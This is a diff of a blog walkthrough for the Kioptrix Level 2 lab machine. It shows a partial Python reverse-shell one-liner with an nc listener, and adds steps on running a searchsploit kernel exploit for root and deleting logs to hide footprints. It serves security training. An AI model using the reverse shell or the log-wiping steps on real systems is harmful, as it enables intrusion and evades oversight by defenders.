@@ -9,7 +9,7 @@ tags: [Vulnhub, Kioptrix, level 2,walkthrough]
 ---
 
 Hi Folks...
-Before moving forward, please try harder and come back later. Still you are stuck then let get started.
+Before moving forward, please try harder and come back later. Still you are stuck then let's get started.
 
 ## Objective
 Gain the root access.
@@ -75,12 +75,34 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 Please do not forget to change the Host IP-Address and listening Port.
 Do we need to remember this command? Hell, No. Our ninja techinque will help us. "Katon: Gōkakyū no Jutsu" --> ```Google-fu```.  Note: No need to worry about "Katon: Gōkakyū no Jutsu". It is intended for anime fan #Naruto.
 
-Before executing the command start the listener on the host
+Before executing the command start the listener on the host.
 ```bash
 nc -lnvp 8888
 ```
 Now we are good to go. Provide the python one-liner in input field of Administrative Web Console. Hurray!!! We got the shell. It might be a lot to grasp. Let's take a 5 min break and proceed with our next task.
 
 #### Privilege Escalation
+There are different ways to achive this based on the information we obtain about the target. For example, looking scheduled task (cron jobs), file permissions, SUID bits, kernal exploits etc,.  
+Let's explore little bit, before finding possible approach for escalation.
+
+![System Info](/assets/img/vulnhub/kioptrix/lvl2/system-info.png "Target Information")
+
+System is running on cent OS 4.5. Let's find whether there is any attack vector using searchsploit.
+
+![Exploit] (/assets/img/vulnhub/kioptrix/lvl2/exploit.png "Exploit")
+
+It does satisfy the requirement. Transfer the .c file to the target and compile it. How do transfer and compile? It is easy, if not I recommend you to use the ninja technique. I'll leave that to you. We have named pwn as our compiled file. Run the exploit. Hurray!!!! WE GOT THE ROOT.
+
+![Pwned](/assets/img/vulnhub/kioptrix/lvl2/root.png "Pwned")
+
 
 #### Post-Exploitation
+
+This step involves the removal of footprints.
+- Delete the downloaded .c and compiled (object) file.
+- Delete the necessary logs (history, apache logs etc)
+
+Note: Whenever we download any file, it is recommended to perform under /tmp/ directory. Since it's contents get deleted on reboot.
+
+### Until next time! Keep Learning And Never give up! 
+That should be your nindo.
